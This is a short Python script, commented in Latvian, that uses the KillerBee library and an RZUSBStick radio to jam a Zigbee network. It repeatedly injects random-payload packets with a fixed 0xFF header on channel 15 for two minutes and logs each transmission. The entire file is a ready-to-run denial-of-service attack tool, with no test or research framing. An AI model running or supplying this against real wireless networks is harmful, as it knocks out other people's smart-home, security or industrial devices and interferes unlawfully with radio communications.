import logging
import random
import time
from killerbee import KillerBee

# Žurnāla konfigurācija
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Parametri
INTERFACE = "1:3"  # RZUSBStick saskarne
CHANNEL = 15  # Zigbee kanāls
DURATION = 120  # Darbības ilgums
PACKET_SIZE = 50  # Pakēšu izmērs
DELAY_BETWEEN_PACKETS = 0.02  # Paketes sutīšanas aizturi
JAM_HEADER = b"\xFF\xFF\xFF\xFF\xFF"  # Uzbrukuma pakešu galvene

def generate_jamming_packet(header, size):
    # Ģenerē paketi traucēšanai ar norādītu virsrakstu un nejaušu lietderīgo slodzi
    payload_size = size - len(header)
    payload = bytes([random.randint(0, 255) for _ in range(payload_size)])
    packet = header + payload
    logging.debug(f"Generated jamming packet: {packet.hex()}")
    return packet

def perform_jamming(interface, channel, duration, packet_size, delay, header):
  # Veic bloķēšanu, bieži nosūtot uzbrukuma paketes.
    try:
        # Killerbee inicializācija
        kb = KillerBee(device=interface)
        kb.set_channel(channel)
        logging.info(f"Initiating a jamming attack on channel {channel} via {interface}.")

        start_time = time.time()
        packets_sent = 0

        while time.time() - start_time < duration:
            try:
                # Pakešu ģenerēšana
                packet = generate_jamming_packet(header, packet_size)

                # Pakešu sutīšana
                kb.inject(packet, channel=channel)
                packets_sent += 1
                logging.debug(f"Jamming packet was sended #{packets_sent}: {packet.hex()}")

            except Exception as e:
                logging.error(f"Packet error: {e}")

            time.sleep(delay)

        kb.close()
        logging.info(f"Jamming is over. Amount of sended packets: {packets_sent}")
    except Exception as e:
        logging.error(f"Device error {interface}: {e}")

if __name__ == "__main__":
    perform_jamming(INTERFACE, CHANNEL, DURATION, PACKET_SIZE, DELAY_BETWEEN_PACKETS, JAM_HEADER)
